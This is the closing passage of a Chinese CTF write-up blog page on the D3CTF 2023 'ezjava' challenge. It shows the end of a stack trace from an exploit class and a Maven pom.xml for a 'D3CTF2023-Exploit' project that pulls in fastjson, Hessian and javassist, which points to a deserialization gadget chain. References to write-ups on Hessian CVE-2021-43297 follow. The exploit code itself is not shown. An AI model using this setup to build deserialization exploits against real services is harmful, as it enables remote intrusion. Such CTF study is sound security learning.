</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>example</span><span class=p>.</span><span class=na>Exp2</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>Exp2</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>85</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/d3ctf-2023-ezjava/7.png width=1830 height=546 loading=lazy alt=img></p><p>看到调用栈发现比exp1还多，而且是可以直接省去的，我怀疑出题人是🤡🤡🤡🤡，以为自己挖到新的 gadget 了</p><p>使用的 pom.xml</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;project</span> <span class=na>xmlns=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>xsi:schemaLocation=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;modelVersion&gt;</span>4.0.0<span class=nt>&lt;/modelVersion&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;groupId&gt;</span>org.example<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;artifactId&gt;</span>D3CTF2023-Exploit<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;version&gt;</span>1.0-SNAPSHOT<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;properties&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;maven.compiler.source&gt;</span>8<span class=nt>&lt;/maven.compiler.source&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;maven.compiler.target&gt;</span>8<span class=nt>&lt;/maven.compiler.target&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class=nt>&lt;/project.build.sourceEncoding&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/properties&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;dependencies&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.javassist<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>javassist<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>3.28.0-GA<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>com.example<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>registry<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>0.0.1<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;scope&gt;</span>system<span class=nt>&lt;/scope&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;systemPath&gt;</span>/Users/admin/Downloads/ezjava/registry/registry-0.0.1-SNAPSHOT.jar<span class=nt>&lt;/systemPath&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>com.example<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>server<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>0.0.1<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;scope&gt;</span>system<span class=nt>&lt;/scope&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;systemPath&gt;</span>/Users/admin/Downloads/ezjava/server/server-0.0.1-SNAPSHOT.jar<span class=nt>&lt;/systemPath&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>com.alibaba<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>fastjson<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>2.0.24<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>com.alipay.sofa<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>hessian<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>4.0.4<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.apache.tomcat.embed<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>tomcat-embed-core<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>9.0.62<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.apache.tomcat.embed<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>tomcat-embed-el<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>9.0.62<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;groupId&gt;</span>org.springframework<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;artifactId&gt;</span>spring-webmvc<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;version&gt;</span>5.3.19<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/dependencies&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/project&gt;</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p><a class=link href=https://pupil857.github.io/2023/05/03/d3ctf-ezjava/ target=_blank rel=noopener>https://pupil857.github.io/2023/05/03/d3ctf-ezjava/</a></p><p><a class=link href=https://aecous.github.io/2023/10/04/D3CTF-x-AntCTF-2023-ezjava/ target=_blank rel=noopener>https://aecous.github.io/2023/10/04/D3CTF-x-AntCTF-2023-ezjava/</a></p><p><a class=link href=https://exp10it.io/2023/05/hessian-cve-2021-43297-d3ctf-2023-ezjava/#d3ctf-2023-ezjava target=_blank rel=noopener>https://exp10it.io/2023/05/hessian-cve-2021-43297-d3ctf-2023-ezjava/#d3ctf-2023-ezjava</a></p></blockquote></section><footer class=article-footer><section class=article-tags></section><section class=article-references><div class=article-references__header><span class=article-references__icon><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
</span><span>参考阅读</span></div><ol class=article-references__list><li><a href=https://pupil857.github.io/2023/05/03/d3ctf-ezjava/ target=_blank rel=noopener>https://pupil857.github.io/2023/05/03/d3ctf-ezjava/</a></li><li><a href=https://aecous.github.io/2023/10/04/D3CTF-x-AntCTF-2023-ezjava/ target=_blank rel=noopener>https://aecous.github.io/2023/10/04/D3CTF-x-AntCTF-2023-ezjava/</a></li><li><a href=https://exp10it.io/2023/05/hessian-cve-2021-43297-d3ctf-2023-ezjava/#d3ctf-2023-ezjava target=_blank rel=noopener>https://exp10it.io/2023/05/hessian-cve-2021-43297-d3ctf-2023-ezjava/#d3ctf-2023-ezjava</a></li></ol></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.7k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>